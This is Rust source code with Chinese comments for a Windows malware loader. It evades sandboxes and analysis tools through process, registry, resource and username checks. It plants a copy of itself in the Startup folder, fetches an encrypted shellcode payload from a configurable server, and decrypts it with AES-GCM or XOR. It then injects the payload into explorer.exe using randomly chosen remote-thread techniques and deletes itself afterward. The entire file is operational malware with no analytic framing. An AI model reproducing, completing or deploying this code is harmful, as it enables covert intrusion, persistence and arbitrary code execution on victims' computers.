#![windows_subsystem = "windows"]
use std::{ptr::null_mut, thread, time::Duration, fs::File, io::Read, path::Path};
use windows::core::PWSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::ToolHelp::*;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, CreateRemoteThread, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW};
use windows::Win32::System::Memory::*;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use std::env;
use std::ffi::OsStr;
use aes_gcm::KeyInit;
use std::os::windows::ffi::OsStrExt;
use sysinfo::{System, SystemExt, ProcessExt, DiskExt};
use windows::Win32::System::SystemInformation::{GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX};
use windows::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO, GetAsyncKeyState, VK_LBUTTON};
use windows::Win32::System::Registry::{RegOpenKeyExA, RegQueryValueExA, HKEY_LOCAL_MACHINE, KEY_READ};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::Aead;
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;
use sha2::{Sha256, Digest};
use toml::Value;
use std::collections::HashMap;
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::Write;

fn fake_func_1() { let _ = 2024 * 3; }
fn fake_func_2() { let s = "data".to_string(); let _ = s.find('a'); }
fn fake_func_3() { let v: Vec<u8> = (10..20).collect(); let _ = v.len(); }
fn fake_func_4() { let _ = std::time::SystemTime::now(); }

struct Config {
    server_url: String,
    server_timeout: u64,
    server_retry_count: u32,
    encryption_key: Vec<u8>,
    encryption_algorithm: String,
    uptime_threshold: u64,
    idle_threshold: u64,
    check_processes: bool,
    check_username: bool,
    target_process: String,
    access_rights: u32,
    delay_before_execution: u64,
    self_delete: bool,
    fake_operations: bool,
}

fn load_config() -> Config {
    let default_config = Config {
        server_url: "https://your-server.com:port/output.bin".to_string(),
        server_timeout: 30,
        server_retry_count: 3,
        encryption_key: vec![0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A, 0x8B],
        encryption_algorithm: "aes-gcm".to_string(),
        uptime_threshold: 300000,
        idle_threshold: 120000,
        check_processes: true,
        check_username: true,
        target_process: "explorer.exe".to_string(),
        access_rights: 0x1F0FFF,
        delay_before_execution: 30,
        self_delete: true,
        fake_operations: true,
    };
    
    let config_path = "config.toml";
    if !Path::new(config_path).exists() {
        return default_config;
    }
    
    let mut file = match File::open(config_path) {
        Ok(f) => f,
        Err(_) => return default_config,
    };
    
    let mut contents = String::new();
    if file.read_to_string(&mut contents).is_err() {
        return default_config;
    }
    
    let parsed_toml: Value = match contents.parse() {
        Ok(v) => v,
        Err(_) => return default_config,
    };
    
    let empty_table = toml::value::Table::new();
    let server = parsed_toml.get("server").and_then(|v| v.as_table()).unwrap_or(&empty_table);
    
    let encryption = parsed_toml.get("encryption").and_then(|v| v.as_table()).unwrap_or(&empty_table);
    
    let sandbox = parsed_toml.get("sandbox_detection").and_then(|v| v.as_table()).unwrap_or(&empty_table);
    
    let target = parsed_toml.get("target_process").and_then(|v| v.as_table()).unwrap_or(&empty_table);
    
    let behavior = parsed_toml.get("behavior").and_then(|v| v.as_table()).unwrap_or(&empty_table);
    
    Config {
        server_url: server.get("url").and_then(|v| v.as_str()).unwrap_or(&default_config.server_url).to_string(),
        server_timeout: server.get("timeout").and_then(|v| v.as_integer()).unwrap_or(default_config.server_timeout as i64) as u64,
        server_retry_count: server.get("retry_count").and_then(|v| v.as_integer()).unwrap_or(default_config.server_retry_count as i64) as u32,
        encryption_key: encryption.get("key").and_then(|v| v.as_array()).map_or_else(
            || default_config.encryption_key.clone(),
            |arr| arr.iter().filter_map(|v| v.as_integer().map(|i| i as u8)).collect()
        ),
        encryption_algorithm: encryption.get("algorithm").and_then(|v| v.as_str()).unwrap_or(&default_config.encryption_algorithm).to_string(),
        uptime_threshold: sandbox.get("uptime_threshold").and_then(|v| v.as_integer()).unwrap_or(default_config.uptime_threshold as i64) as u64,
        idle_threshold: sandbox.get("idle_threshold").and_then(|v| v.as_integer()).unwrap_or(default_config.idle_threshold as i64) as u64,
        check_processes: sandbox.get("check_processes").and_then(|v| v.as_bool()).unwrap_or(default_config.check_processes),
        check_username: sandbox.get("check_username").and_then(|v| v.as_bool()).unwrap_or(default_config.check_username),
        target_process: target.get("name").and_then(|v| v.as_str()).unwrap_or(&default_config.target_process).to_string(),
        access_rights: target.get("access_rights").and_then(|v| v.as_integer()).unwrap_or(default_config.access_rights as i64) as u32,
        delay_before_execution: behavior.get("delay_before_execution").and_then(|v| v.as_integer()).unwrap_or(default_config.delay_before_execution as i64) as u64,
        self_delete: behavior.get("self_delete").and_then(|v| v.as_bool()).unwrap_or(default_config.self_delete),
        fake_operations: behavior.get("fake_operations").and_then(|v| v.as_bool()).unwrap_or(default_config.fake_operations),
    }
}

fn delete_self() {
    let exe = env::current_exe().unwrap();
    let cmd = format!("cmd /C ping -n 3 127.0.0.1 >nul & del /f /q \"{}\"", exe.display());
    let mut cmd_w: Vec<u16> = OsStr::new(&cmd).encode_wide().chain(Some(0)).collect();
    let mut si = STARTUPINFOW::default();
    let mut pi = PROCESS_INFORMATION::default();
    unsafe {
        CreateProcessW(
            None,
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_NO_WINDOW,
            None,
            None,
            &mut si,
            &mut pi,
        );
    }
}

fn create_persistence() -> bool {
    let exe = match env::current_exe() {
        Ok(path) => path,
        Err(_) => return false,
    };
    
    let startup_path = match env::var("APPDATA") {
        Ok(appdata) => Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
        Err(_) => return false,
    };
    
    if !startup_path.exists() {
        return false;
    }
    
    let random_name: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect();
    
    let target_path = startup_path.join(format!("{}.exe", random_name));
    
    let mut source = match File::open(&exe) {
        Ok(file) => file,
        Err(_) => return false,
    };
    
    let mut dest = match File::create(&target_path) {
        Ok(file) => file,
        Err(_) => return false,
    };
    
    let mut buffer = Vec::new();
    if source.read_to_end(&mut buffer).is_err() {
        return false;
    }
    
    if dest.write_all(&buffer).is_err() {
        return false;
    }
    
    true
}

fn is_short_uptime(threshold: u64) -> bool {
    unsafe { GetTickCount64() < threshold }
}

fn is_no_user_input(threshold: u64) -> bool {
    unsafe {
        // 检测鼠标点击
        if GetAsyncKeyState(VK_LBUTTON.0 as i32) as u32 & 0x8000 != 0 {
            return false;
        }
        
        let mut lii = LASTINPUTINFO { cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32, dwTime: 0 };
        if GetLastInputInfo(&mut lii).as_bool() {
            let idle = GetTickCount64() - lii.dwTime as u64;
            idle > threshold
        } else {
            false
        }
    }
}

fn is_sandbox_user() -> bool {
    let user = env::var("USERNAME").unwrap_or_default().to_lowercase();
    let computer = env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    
    let sandbox_keywords = [
        "sandbox", "test", "virus", "malware", "sample", "lab", "analyze",
        "cuckoo", "vbox", "vmware", "virtual", "qemu", "xen", "analysis"
    ];
    
    for keyword in &sandbox_keywords {
        if user.contains(keyword) || computer.contains(keyword) {
            return true;
        }
    }
    
    false
}

fn is_low_resources() -> bool {
    // 检测内存大小 (小于4GB可能是沙箱)
    unsafe {
        let mut mem_status = MEMORYSTATUSEX::default();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        
        if GlobalMemoryStatusEx(&mut mem_status).as_bool() {
            if mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024 {
                return true;
            }
        }
    }
    
    // 检测磁盘大小 (小于60GB可能是沙箱)
    let sys = System::new_all();
    for disk in sys.disks() {
        if disk.total_space() < 60 * 1024 * 1024 * 1024 {
            return true;
        }
    }
    
    // 检测CPU核心数 (少于2核可能是沙箱)
    if sys.physical_core_count().unwrap_or(0) < 2 {
        return true;
    }
    
    false
}

fn is_vm_registry() -> bool {
    unsafe {
        let mut h_key = std::mem::zeroed();
        let paths = [
            "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
            "SYSTEM\\CurrentControlSet\\Services\\vmware",
            "SYSTEM\\CurrentControlSet\\Services\\VMTools",
            "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"
        ];
        
        for path in &paths {
            let path_bytes = format!("{}", path).as_bytes().to_vec();
            let path_cstr = std::ffi::CString::new(path_bytes).unwrap_or_default();
            let pcstr = windows::core::PCSTR(path_cstr.as_ptr() as *const u8);
            
            let result = unsafe { RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                pcstr,
                0,
                KEY_READ,
                &mut h_key
            )};
            
            if result.is_ok() {
                return true;
            }
        }
    }
    
    false
}

fn is_sandbox_process_running() -> bool {
    let sandbox_processes = [
        // 虚拟机和沙箱工具
        "vmsrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "vboxservice.exe", "vmwareuser.exe", 
        "vmwaretray.exe", "vgauthservice.exe", "vmacthlp.exe", "vmusrvc.exe", "prl_tools.exe",
        "prl_cc.exe", "sandboxiedcomlaunch.exe", "sandboxierpcss.exe", "sbiesvc.exe",
        "cuckoomonitor.exe", "joeboxserver.exe", "joeboxcontrol.exe",
        
        // 调试和分析工具
        "wireshark.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
        "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe", "ida.exe", "ida64.exe",
        "pestudio.exe", "tcpview.exe", "autoruns.exe", "autorunsc.exe", "filemon.exe", 
        "regmon.exe", "cffexplorer.exe", "processhacker.exe", "dumpcap.exe", "fiddler.exe",
        "scylla.exe", "immunitydebugger.exe", "dnspy.exe", "ilspy.exe", "reflector.exe",
        "ghidra.exe", "hiew32.exe", "lordpe.exe", "peview.exe", "resourcehacker.exe",
        
        // 网络分析工具
        "netmon.exe", "ethereal.exe", "tcpdump.exe", "windump.exe", "networktrafficview.exe",
        "charles.exe", "burpsuite.exe", "owasp zap.exe", "mitmproxy.exe", "ettercap.exe"
    ];

    let sys = System::new_all();
    
    // 检测进程数量是否过少（可能是沙箱环境）
    if sys.processes().len() < 30 {
        return true;
    }
    
    // 检测特定沙箱进程
    for process in sys.processes_by_name("") {
        let name = process.name().to_lowercase();
        for sandbox_process in &sandbox_processes {
            if name.contains(&sandbox_process.to_lowercase()) {
                return true;
            }
        }
    }
    
    // 检测是否缺少常见的系统进程（可能是沙箱环境）
    let common_processes = ["explorer.exe", "svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe"];
    let mut found_count = 0;
    
    for common in &common_processes {
        if sys.processes_by_name(common).count() > 0 {
            found_count += 1;
        }
    }
    
    if found_count < 4 {
        return true;
    }

    false
}

fn main() {
    // 加载配置
    let config = load_config();
    
    // 环境检测和沙箱对抗
    if is_short_uptime(config.uptime_threshold) || 
       is_no_user_input(config.idle_threshold) || 
       (config.check_username && is_sandbox_user()) || 
       (config.check_processes && is_sandbox_process_running()) || 
       is_low_resources() || 
       is_vm_registry() {
        std::process::exit(0);
    }
    
    // 创建持久化
    let _ = create_persistence();
    
    // 行为伪装和延迟执行
    if config.fake_operations {
        // 延迟执行，模拟正常程序的启动时间
        thread::sleep(Duration::from_secs(config.delay_before_execution));
        
        // 访问系统文件，模拟正常的系统操作
        let _ = File::open("C:\\Windows\\System32\\drivers\\etc\\hosts");
        let _ = File::open("C:\\Windows\\System32\\kernel32.dll");
        
        // 执行假解密操作，混淆真实意图
        let _fake = base64::decode("SGVsbG8gd29ybGQ=").unwrap_or_default();
        
        // 调用多态垃圾代码，增加代码复杂度
        fake_func_1();
        fake_func_2();
        fake_func_3();
        fake_func_4();
    }
    
    // 数据获取和解密
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(config.server_timeout))
        .build()
        .unwrap_or_else(|_| reqwest::blocking::Client::new());
    
    let mut retry_count = 0;
    let mut ciphertext = Vec::new();
    
    while retry_count < config.server_retry_count {
        match client.get(&config.server_url).send() {
            Ok(resp) => {
                if let Ok(bytes) = resp.bytes() {
                    ciphertext = bytes.to_vec();
                    break;
                }
            },
            Err(_) => {
                retry_count += 1;
                thread::sleep(Duration::from_secs(2));
                continue;
            }
        }
    }
    
    if ciphertext.is_empty() {
        std::process::exit(0);
    }
    
    // 解密数据
    let shellcode = match config.encryption_algorithm.as_str() {
        "aes-gcm" => {
            // 使用AES-GCM解密
            if ciphertext.len() < 28 { // 至少需要12字节nonce + 16字节tag
                std::process::exit(0);
            }
            
            let nonce_bytes = &ciphertext[0..12];
            let ciphertext_bytes = &ciphertext[12..];
            
            let key_bytes = if config.encryption_key.len() >= 32 {
                config.encryption_key[0..32].to_vec()
            } else {
                // 如果密钥不足32字节，使用SHA-256扩展
                let mut hasher = Sha256::new();
                hasher.update(&config.encryption_key);
                hasher.finalize().to_vec()
            };
            
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let nonce = aes_gcm::Nonce::from_slice(nonce_bytes);
            let cipher = Aes256Gcm::new(key);
            
            match cipher.decrypt(nonce, ciphertext_bytes) {
                Ok(plaintext) => plaintext,
                Err(_) => std::process::exit(0)
            }
        },
        _ => {
            // 默认使用XOR解密
            ciphertext.iter()
                .enumerate()
                .map(|(i, &b)| b ^ config.encryption_key[i % config.encryption_key.len()])
                .collect()
        }
    };

    // 进程注入和执行
    unsafe {
        // 枚举系统进程，查找目标进程
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        let mut entry = PROCESSENTRY32::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let mut found = false;
        let mut pid = 0;
        
        if Process32First(snapshot, &mut entry).as_bool() {
            loop {
                let name = String::from_utf8_lossy(
                    &entry.szExeFile.iter().map(|&c| c as u8).take_while(|&c| c != 0).collect::<Vec<u8>>()
                ).to_lowercase();
                if name == config.target_process.to_lowercase() {
                    pid = entry.th32ProcessID;
                    found = true;
                    break;
                }
                if !Process32Next(snapshot, &mut entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        
        if !found {
            return;
        }
        
        // 打开目标进程，获取进程句柄
        let h_proc = OpenProcess(PROCESS_ACCESS_RIGHTS(config.access_rights), false, pid).unwrap();
        if h_proc.is_invalid() {
            return;
        }
        
        // 选择注入技术
        let injection_technique = thread_rng().gen_range(0..3); // 随机选择注入技术
        
        match injection_technique {
            0 => {
                // 技术1: 标准CreateRemoteThread注入
                let addr = VirtualAllocEx(
                    h_proc,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                
                if addr.is_null() {
                    CloseHandle(h_proc);
                    return;
                }
                
                let mut written = 0;
                let ok = WriteProcessMemory(
                    h_proc,
                    addr,
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    Some(&mut written),
                ).as_bool();
                
                if !ok || written != shellcode.len() {
                    CloseHandle(h_proc);
                    return;
                }
                
                let h_thread = CreateRemoteThread(
                    h_proc,
                    None,
                    0,
                    Some(std::mem::transmute(addr)),
                    None,
                    0,
                    None,
                ).ok();
                
                if let Some(h_thread) = h_thread {
                    CloseHandle(h_thread);
                }
            },
            1 => {
                // 技术2: 分段写入内存并执行
                let addr = VirtualAllocEx(
                    h_proc,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE, // 初始为读写权限
                );
                
                if addr.is_null() {
                    CloseHandle(h_proc);
                    return;
                }
                
                // 分段写入内存
                let chunk_size = 256;
                for i in (0..shellcode.len()).step_by(chunk_size) {
                    let end = std::cmp::min(i + chunk_size, shellcode.len());
                    let chunk = &shellcode[i..end];
                    
                    let mut written = 0;
                    let ok = WriteProcessMemory(
                        h_proc,
                        (addr as usize + i) as *mut _,
                        chunk.as_ptr() as _,
                        chunk.len(),
                        Some(&mut written),
                    ).as_bool();
                    
                    if !ok || written != chunk.len() {
                        CloseHandle(h_proc);
                        return;
                    }
                    
                    // 短暂延迟，降低检测风险
                    thread::sleep(Duration::from_millis(10));
                }
                
                // 修改内存权限为可执行
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                let result = unsafe { VirtualProtectEx(
                    h_proc,
                    addr,
                    shellcode.len(),
                    PAGE_EXECUTE_READ,
                    &mut old_protect,
                )};
                if result.as_bool() {
                    let h_thread = CreateRemoteThread(
                        h_proc,
                        None,
                        0,
                        Some(std::mem::transmute(addr)),
                        None,
                        0,
                        None,
                    ).ok();
                    
                    if let Some(h_thread) = h_thread {
                        CloseHandle(h_thread);
                    }
                }
            },
            _ => {
                // 技术3: 使用RWX内存，但先写入垃圾数据，然后覆盖
                let addr = VirtualAllocEx(
                    h_proc,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                
                if addr.is_null() {
                    CloseHandle(h_proc);
                    return;
                }
                
                // 先写入随机数据
                let mut random_data = vec![0u8; shellcode.len()];
                thread_rng().fill(&mut random_data[..]);
                
                let mut written = 0;
                let _ = WriteProcessMemory(
                    h_proc,
                    addr,
                    random_data.as_ptr() as _,
                    random_data.len(),
                    Some(&mut written),
                );
                
                // 短暂延迟
                thread::sleep(Duration::from_millis(50));
                
                // 覆盖为真实shellcode
                written = 0;
                let ok = WriteProcessMemory(
                    h_proc,
                    addr,
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    Some(&mut written),
                ).as_bool();
                
                if !ok || written != shellcode.len() {
                    CloseHandle(h_proc);
                    return;
                }
                
                let h_thread = CreateRemoteThread(
                    h_proc,
                    None,
                    0,
                    Some(std::mem::transmute(addr)),
                    None,
                    0,
                    None,
                ).ok();
                
                if let Some(h_thread) = h_thread {
                    CloseHandle(h_thread);
                }
            }
        }
        
        CloseHandle(h_proc);
        
        // 执行完成后删除自身文件
        if config.self_delete {
            delete_self();
        }
    }
}
